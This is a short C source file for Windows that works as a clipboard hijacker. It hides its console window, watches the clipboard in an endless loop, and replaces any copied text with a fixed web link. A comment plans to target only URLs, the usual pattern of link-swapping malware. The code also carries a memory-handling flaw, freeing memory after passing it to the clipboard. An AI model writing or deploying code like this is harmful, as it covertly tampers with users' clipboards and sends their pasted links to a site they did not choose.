#SIMPLY REPLACES THE CLIPBOARD DATA WITH A HTTP LINK
#TODO: Modify only urls, even if the text is "aaaaa http://foo.bar/b/bb ccc"

#include <Windows.h>
#pragma warning(disable:4996)
#pragma comment(lib,"user32")
#pragma comment(lib,"kernel32")


void			clipboard_mod(); 

int main()
{
	FreeConsole();
	DWORD clipboard_seq = GetClipboardSequenceNumber();
	while (1) {
		if (clipboard_seq != GetClipboardSequenceNumber()) { //only run when clipboard updated
			clipboard_mod();
		}
		clipboard_seq = GetClipboardSequenceNumber();
		Sleep(20);
	}
}

void clipboard_mod() {
	OpenClipboard(NULL);
	if (IsClipboardFormatAvailable(CF_TEXT)){
		HANDLE cp_handle = GetClipboardData(CF_TEXT);
		char *cp_str = { 0 };
		cp_str = (char *)cp_handle; //turn into string
									//now mod
		cp_str = "http://randomtotallysfwlink.xyz";
		size_t cp_str_size = strlen(cp_str) + 1;
		HGLOBAL hmem = GlobalAlloc(GMEM_MOVEABLE, cp_str_size);
		memcpy(GlobalLock(hmem), (LPCTSTR)cp_str, cp_str_size);
		GlobalUnlock(hmem);
		EmptyClipboard();
		SetClipboardData(CF_TEXT, hmem);
		GlobalFree(hmem);
	}
	CloseClipboard();
}
